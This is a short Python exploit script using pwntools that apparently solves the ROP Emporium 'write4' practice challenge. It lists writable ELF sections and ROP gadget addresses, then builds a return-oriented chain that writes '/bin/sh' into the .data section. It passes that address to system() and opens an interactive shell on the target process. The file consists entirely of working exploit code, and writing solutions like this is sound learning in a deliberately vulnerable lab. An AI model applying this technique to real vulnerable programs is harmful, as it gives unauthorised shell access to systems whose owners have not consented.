from pwn import *

#[Sections]  read and write
#Nm Paddr       Size Vaddr      Memsz Perms Name
#19 0x00000e10     8 0x00600e10     8 -rw- .init_array
#20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
#21 0x00000e20     8 0x00600e20     8 -rw- .jcr
#22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
#23 0x00000ff8     8 0x00600ff8     8 -rw- .got
#24 0x00001000    80 0x00601000    80 -rw- .got.plt
#25 0x00001050    16 0x00601050    16 -rw- .data
#26 0x00001060     0 0x00601060    48 -rw- .bss
write_to = 0x00601050

#  0x00400820             4d893e  mov qword [r14], r15
#  0x00400823                 c3  ret
mov_r15_r14_pointer = 0x00400820

# 0x00400893: pop rdi; ret;
pop_rdi = 0x00400893

#  0x00400890               415e  pop r14
#  0x00400892               415f  pop r15
#  0x00400894                 c3  ret
pop_r14_r15 = 0x00400890

write4 = ELF('write4')

rop_chain = "Z"*40

# prime registers for memory corruption fun
rop_chain += p64(pop_r14_r15)
rop_chain += p64(write_to)
rop_chain += "/bin/sh\x00"
rop_chain += p64(mov_r15_r14_pointer)
rop_chain += p64(pop_rdi)
rop_chain += p64(write_to)

# 0x004005e0    1 6            sym.imp.system
rop_chain += p64(0x004005e0)

p = process(write4.path)
p.recvuntil('> ')
p.sendline(rop_chain)
p.interactive()
